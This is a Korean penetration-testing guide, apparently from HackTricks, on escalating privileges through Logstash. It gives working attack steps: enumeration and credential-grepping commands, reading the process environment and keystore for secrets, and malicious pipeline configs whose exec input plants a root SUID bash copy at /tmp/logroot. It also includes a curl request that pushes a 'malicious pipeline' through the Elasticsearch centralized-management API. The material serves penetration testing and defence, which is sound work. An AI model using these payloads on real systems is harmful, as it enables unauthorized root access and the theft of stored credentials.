# Logstash 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash는 **pipeline**이라는 시스템을 통해 로그를 **수집, 변환, 전달**하는 데 사용됩니다. 이러한 pipeline은 **input**, **filter**, **output** 단계로 구성됩니다.<sup>[[4]](#references)</sup> Logstash가 침해된 시스템에서 실행될 때 흥미로운 점이 있습니다.

### Pipeline 구성

Debian 및 RPM 패키지 설치에서는 pipeline이 **/etc/logstash/pipelines.yml**을 통해 구성되며, 이 파일에는 pipeline 구성 파일의 위치가 나열됩니다. 다른 배포판에서는 `pipelines.yml`이 Logstash의 `path.settings` 디렉터리에 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

이 파일은 pipeline 구성이 포함된 **.conf** 파일의 위치를 보여 줍니다. **Elasticsearch output**을 사용하는 경우 `user`/`password`, `cloud_auth` 또는 `api_key` 설정을 확인하세요. 계정의 유효 권한은 Elasticsearch에 따라 달라집니다. `path.config` glob은 해당 pipeline에 대해 일치하는 모든 파일을 로드합니다.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash를 `pipelines.yml` 대신 `-f <directory>`로 시작하면 `-f`가 우선 적용되며, **해당 디렉터리의 모든 파일이 사전식 순서로 연결되어 하나의 config로 파싱됩니다**.<sup>[[6]](#references)[[7]](#references)</sup> 이로 인해 공격 관점에서 다음 두 가지 영향이 발생합니다.

- `000-input.conf` 또는 `zzz-output.conf`처럼 추가한 파일로 최종 pipeline의 조립 방식을 바꿀 수 있습니다.
- 형식이 잘못된 파일로 인해 통합 config의 유효성 검사가 실패할 수 있습니다. reload 중에는 Logstash가 이전 pipeline을 유지하므로, auto-reload에 의존하기 전에 payload를 검증하세요.<sup>[[1]](#references)</sup>

### 침해된 호스트에서 빠르게 열거하기

Logstash가 설치된 시스템에서 다음을 빠르게 확인합니다:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

또한 로컬 모니터링 API에 접근할 수 있는지 확인하세요. 기본적으로 **127.0.0.1:9600**에 바인딩되며, 호스트에 진입한 뒤에는 보통 이것으로 충분합니다.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

이러한 엔드포인트는 pipeline ID와 설정, 런타임 메트릭, config-reload 성공/실패 카운터를 노출하므로 변경 사항이 적용되었는지 확인하는 데 도움이 됩니다.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

복구한 credential이 **Elasticsearch**를 대상으로 한다면 [Elasticsearch에 관한 다른 페이지](../../network-services-pentesting/9200-pentesting-elasticsearch.md)를 확인하세요.

### 동적 command 출력을 제공하는 file input

현재 사용자는 pipeline 설정을 읽기만 할 수 있지만, 설정의 [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file)은 사용자가 쓸 수 있는 경로를 감시할 수 있습니다. 해당 input에서 시작해 로드된 pipeline을 따라가며 [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok)를 거쳐 [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec)으로 이어지는지 확인하세요. exec output은 `command`를 shell을 통해 실행하고, `%{field}` 값을 shell 메타문자 필터링 없이 대체합니다. 쓰기 가능한 input 경로가 권한 상승의 단서가 되려면 실행 중인 서비스의 권한이 더 높고, 사용자의 파일이 실제로 감시 중인 input에 들어갈 수 있으며, 필터와 output 조건에 따라 해당 내용이 command 필드로 전달되고, output plugin이 설치되어 활성화되어 있어야 합니다. 디렉터리 탐색/쓰기 권한, file-input 추적 상태, 유효 서비스 계정을 각각 확인하세요. 수동 열거 중에는 테스트 이벤트를 쓰거나 output을 실행하지 마세요.

### Writable Pipelines를 통한 Privilege Escalation

Privilege Escalation을 시도하려면 먼저 Logstash 서비스가 실제로 어떤 사용자로 실행되는지 확인하세요. root 또는 **logstash** 사용자라고 가정하지 마세요. 다음 조건 중 **하나**를 충족해야 합니다.

- pipeline **.conf** 파일에 대한 **쓰기 권한**이 있거나 **또는**
- **/etc/logstash/pipelines.yml** 파일에서 와일드카드를 사용하고, 대상 폴더에 쓸 수 있어야 합니다.<sup>[[6]](#references)[[7]](#references)</sup>

또한 다음 조건 중 **하나**를 충족해야 합니다.

- Logstash 서비스를 재시작할 수 있거나 **또는**
- **/etc/logstash/logstash.yml** 파일에서 **config.reload.automatic: true**로 설정되어 있어야 합니다.<sup>[[1]](#references)[[15]](#references)</sup>

설정에서 와일드카드를 사용하는 경우, 이 와일드카드와 일치하는 파일을 만들면 command를 실행할 수 있습니다.<sup>[[7]](#references)[[9]](#references)</sup> 예를 들면 다음과 같습니다.

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

여기서 **interval**은 실행 빈도를 초 단위로 결정합니다. 주어진 예시에서는 **whoami** 명령이 120초마다 실행되며, 출력은 **/tmp/output.log**에 기록됩니다.<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml**에서 **config.reload.automatic: true**로 설정하면, Logstash는 재시작하지 않아도 새 파이프라인 구성을 자동으로 감지하고 적용합니다.<sup>[[1]](#references)[[15]](#references)</sup> 와일드카드가 없어도 기존 구성을 수정할 수 있지만, 서비스 중단이 발생하지 않도록 주의해야 합니다.

### 더 안정적인 Pipeline Payload

`exec` input plugin은 현재 릴리스에서도 작동하며, `interval` 또는 `schedule` 중 하나가 필요합니다. Logstash JVM을 **forking**하여 실행하므로, 메모리가 부족하면 payload가 조용히 실행되지 않는 대신 `ENOMEM` 오류가 발생할 수 있습니다.<sup>[[9]](#references)</sup>

서비스에 root 소유 SUID 파일을 만들 권한이 충분하다면, 지속성 있는 아티팩트를 남기는 것이 실용적인 privilege-escalation payload입니다:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

재시작 권한은 없지만 프로세스에 시그널을 보낼 수 있다면, Logstash는 Unix 계열 시스템에서 **SIGHUP**을 통한 reload도 지원합니다:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

모든 플러그인이 reload에 적합한 것은 아닙니다. 예를 들어 **stdin** input은 자동 reload를 방해하므로 `config.reload.automatic`이 항상 변경 사항을 적용한다고 가정하지 마세요.<sup>[[1]](#references)</sup>

### Logstash에서 Secrets 탈취하기

코드 실행에만 집중하기 전에 Logstash가 이미 접근할 수 있는 데이터를 수집하세요.

- Credentials는 `elasticsearch {}` outputs, `http_poller` URLs/settings, JDBC inputs 또는 cloud 관련 설정에 있을 수 있습니다. 이러한 플러그인의 credential 필드는 검색해 볼 가치가 있습니다.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings는 **`/etc/logstash/logstash.keystore`** 또는 다른 `path.settings` 디렉터리에 있을 수 있습니다.<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password는 **`LOGSTASH_KEYSTORE_PASS`**를 통해 전달될 수 있으며, RPM/DEB 설치에서는 **`/etc/sysconfig/logstash`**의 service environment variables를 불러옵니다.<sup>[[10]](#references)</sup>
- `${VAR}`를 사용한 environment-variable expansion은 Logstash 시작 시 처리되므로, service environment를 살펴볼 가치가 있습니다.<sup>[[14]](#references)</sup>

유용한 점검 항목:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

이 내용도 확인해 볼 가치가 있습니다. **CVE-2023-46672**는 특정 상황에서 Logstash가 keystore에 저장되어 구성에서 참조되는 secret을 포함한 민감한 정보를 로그에 기록했음을 보여 주었습니다. 해당 상황이 적용될 수 있다면 이전 Logstash 로그와 `journald` 항목을 검토하세요.<sup>[[3]](#references)</sup>

### 중앙 집중식 Pipeline Management 악용

일부 환경에서는 호스트가 로컬 `.conf` 파일에 전혀 의존하지 **않습니다**. **`xpack.management.enabled: true`**가 구성되어 있으면 Logstash는 Elasticsearch/Kibana에서 중앙 관리되는 pipeline을 가져올 수 있으며, 이 모드를 활성화한 뒤에는 로컬 pipeline 구성이 더 이상 단일 기준이 아닙니다.<sup>[[2]](#references)</sup>

따라서 공격 경로가 달라집니다.

1. 로컬 Logstash 설정, keystore 또는 로그에서 Elastic 자격 증명을 찾아냅니다.<sup>[[3]](#references)[[10]](#references)</sup>
2. 해당 계정에 **`manage_logstash_pipelines`** cluster privilege가 있는지 확인합니다.<sup>[[16]](#references)</sup>
3. Logstash 호스트가 다음 poll interval에 payload를 실행하도록 중앙 관리 pipeline을 생성하거나 교체합니다.<sup>[[2]](#references)[[16]](#references)</sup>

이 기능에 사용되는 Elasticsearch API는 다음과 같습니다.<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

이는 로컬 파일이 읽기 전용이지만 Logstash가 이미 원격에서 pipeline을 가져오도록 등록되어 있을 때 특히 유용합니다.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Config 파일 다시 불러오기](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: 중앙 집중식 Pipeline 관리 구성하기](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 보안 업데이트 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline 만들기](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash 디렉터리 레이아웃](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: 여러 Pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: 명령줄에서 Logstash 실행하기](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: API로 Logstash 모니터링하기](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: 보안 설정을 위한 Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: 환경 변수 사용하기](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash Pipeline 만들기 또는 업데이트하기](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipeline 설정 가져오기](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipeline 통계 가져오기](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
